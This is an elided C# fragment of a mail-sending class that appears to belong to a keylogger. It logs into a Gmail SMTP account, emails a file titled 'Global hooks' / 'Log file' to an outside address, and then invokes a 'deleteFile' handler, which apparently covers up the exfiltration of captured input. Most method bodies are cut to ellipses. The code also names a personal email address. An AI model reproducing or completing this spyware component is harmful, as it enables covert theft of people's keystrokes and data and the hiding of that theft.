    ...
    class MailService
    {
        ...
        public MailService(ClearFile handler)
        {
            ...
            catch (Exception ex)
            {
                ...
                {
                    Credentials =
                        new System.Net.NetworkCredential("andrei.shakarov@gmail.com", ""),
                    EnableSsl = true
                };
            }
        }
        ...
        public void SendMail(string filePath)
        {
            try
            {
                ...
                try
                {
                    ...
                    mail.Subject = "Global hooks";
                    mail.Body = "Log file";
                }
                catch (FormatException e)
                {
                    mail.From = new MailAddress("andrei.shakarov@gmail.com");
                    mail.To.Add(new MailAddress("password@gmail.com"));
                }
        ...
        private void SendCompleted(object sender, AsyncCompletedEventArgs args)
        {
            ...
            {
                _handler.Invoke(args.UserState.ToString()); // deleteFile
